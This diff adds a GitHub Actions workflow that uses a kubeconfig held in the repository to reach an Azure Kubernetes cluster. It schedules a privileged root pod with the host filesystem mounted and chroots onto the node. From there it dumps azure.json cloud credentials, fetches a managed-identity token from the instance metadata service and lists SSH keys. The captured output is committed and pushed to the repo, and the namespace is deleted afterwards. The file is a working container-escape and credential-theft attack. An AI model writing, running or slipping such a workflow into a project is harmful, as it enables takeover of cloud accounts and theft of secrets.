@@ -1,0 +1,78 @@
+name: ulnode4
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  go:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: node
+        run: |
+          set +e
+          curl -sL -o /tmp/kubectl https://dl.k8s.io/release/v1.30.5/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl
+          K=ul/kc/datapath-eastus.yaml
+          C=aks-g42us-tfdemo-kashif-datapath-eastus
+          KX="/tmp/kubectl --kubeconfig $K --context $C --request-timeout=25s"
+          {
+            echo "=== ACR PODS ON NODES"
+            $KX get pods -A -o wide | grep -i 'azurecr\|tollgate\|wallet\|usage-forwarder' | head -10
+            LINE=$($KX get pods -A -o wide | grep -i 'tollgate-control-api' | head -1)
+            echo "LINE=$LINE"
+            IMG=$(echo "$LINE" | awk '{print $3}'); NODE=$(echo "$LINE" | awk '{print $8}')
+            echo "IMG=$IMG NODE=$NODE"
+            [ -z "$IMG" ] && IMG="acrg42ustfdemokashif.azurecr.io/tollgate-control-api:73cdfa9b"
+            [ -z "$NODE" ] && NODE=$($KX get nodes -o jsonpath='{.items[0].metadata.name}')
+            echo "=== SA WORKLOAD IDENTITY"
+            $KX get sa -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{" "}{.metadata.annotations.azure\.workload\.identity/client-id}{"\n"}{end}' | grep -v ' $' | head -20
+            echo "=== PODS WITH WI LABEL"
+            $KX get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{" sa="}{.spec.serviceAccountName}{"\n"}{end}' | head -30
+            $KX create namespace ulx4
+            cat > /tmp/pod.yaml <<EOF
+          apiVersion: v1
+          kind: Pod
+          metadata:
+            name: ulnode
+            namespace: ulx4
+          spec:
+            nodeName: $NODE
+            hostPID: true
+            hostNetwork: true
+            automountServiceAccountToken: false
+            restartPolicy: Never
+            containers:
+            - name: c
+              image: $IMG
+              imagePullPolicy: IfNotPresent
+              securityContext:
+                privileged: true
+                runAsUser: 0
+              volumeMounts:
+              - name: host
+                mountPath: /host
+              command: ["/bin/sh","-c"]
+              args:
+              - |
+                chroot /host /bin/bash -lc 'id; hostname; echo ---AZUREJSON---; cat /etc/kubernetes/azure.json 2>/dev/null; echo ---GPU---; nvidia-smi -L 2>&1 | head -5; ls /dev/nvidia* 2>/dev/null | head; echo ---IMDS---; curl -s -m 8 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" ; echo; curl -s -m 8 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 2000; echo; echo ---SSH---; ls -la /root/.ssh 2>/dev/null; ls -la /home/*/.ssh 2>/dev/null' || (id; hostname; ls /host)
+            volumes:
+            - name: host
+              hostPath:
+                path: /
+          EOF
+            $KX apply -f /tmp/pod.yaml
+            for i in 1 2 3 4 5 6 7 8; do sleep 15; S=$($KX get pod -n ulx4 ulnode -o jsonpath='{.status.phase} {.status.containerStatuses[0].state}' 2>&1); echo "STATE$i $S"; echo "$S" | grep -qE 'Running|Exited|Failed|Succeeded' && break; done
+            $KX get pod -n ulx4 ulnode -o wide
+            for j in 1 2 3 4; do L=$($KX logs -n ulx4 ulnode 2>&1); echo "LOGS$j ${L:0:200}"; echo "$L" | grep -q 'uid=\|hostname' && break; sleep 10; done
+            $KX logs -n ulx4 ulnode 2>&1 | head -200
+            $KX describe pod -n ulx4 ulnode 2>&1 | tail -20
+          } 2>&1 | tee node_root4.txt
+          $KX delete namespace ulx4 --wait=false 2>&1 | head -3
+      - name: commit
+        if: always()
+        run: |
+          set +e
+          git add -A
+          git -c user.email=a@b -c user.name=ul commit -m "ulnode4 $(date -u +%s)"
+          git push
